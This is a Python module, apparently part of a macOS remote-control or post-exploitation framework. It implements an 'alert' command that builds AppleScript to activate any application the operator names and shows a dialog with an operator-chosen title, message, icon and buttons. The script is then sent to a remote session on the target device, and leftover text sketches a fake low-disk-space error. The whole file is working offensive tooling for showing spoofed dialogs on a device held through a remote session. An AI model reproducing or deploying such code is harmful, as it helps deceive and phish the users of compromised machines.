import time
import json
import modules.helper as h

class command:
    def __init__(self):
        self.name = "alert"
        self.description = "Make alert show up on device."
        self.type = "applescript"

    def run(self,session,cmd_data):
        title = raw_input(h.WW+"[>]"+h.WHITE+" Alert Title: "+h.ENDC)
        message = raw_input(h.WW+"[>]"+h.WHITE+" Alert Message: "+h.ENDC)
        icon = raw_input(h.WW+"[>]"+h.WHITE+" Alert Icon: "+h.ENDC)
        application = raw_input(h.WW+"[>]"+h.WHITE+" Alert Application: "+h.ENDC)
        fbutton = raw_input(h.WW+"[>]"+h.WHITE+" First Button: "+h.ENDC)
        sbutton = raw_input(h.WW+"[>]"+h.WHITE+" Second Button: "+h.ENDC)
        one = '"'
        payload = """
        tell application """+one+""""""+application+""""""+one+"""
            activate
            
            set theAlertText to "An error has occurred."
            set theAlertMessage to "The amount of available free space is dangerously low. Would you like to continue?"
            
                try
                    display dialog """+one+""""""+message+""""""+one+""" with title """+one+""""""+title+""""""+one+""" buttons {"""+one+""""""+fbutton+""""""+one+""", """+one+""""""+sbutton+""""""+one+"""} default button """+one+""""""+fbutton+""""""+one+""" cancel button """+one+""""""+sbutton+""""""+one+""" with icon path to resource """+one+""""""+icon+""".icns"""+one+""" in bundle "/System/Library/CoreServices/CoreTypes.bundle"
                end try
                        
        end tell        
        """
        cmd_data.update({"cmd":"applescript","args":payload})
        alert = session.send_command(cmd_data).strip()
        return ""
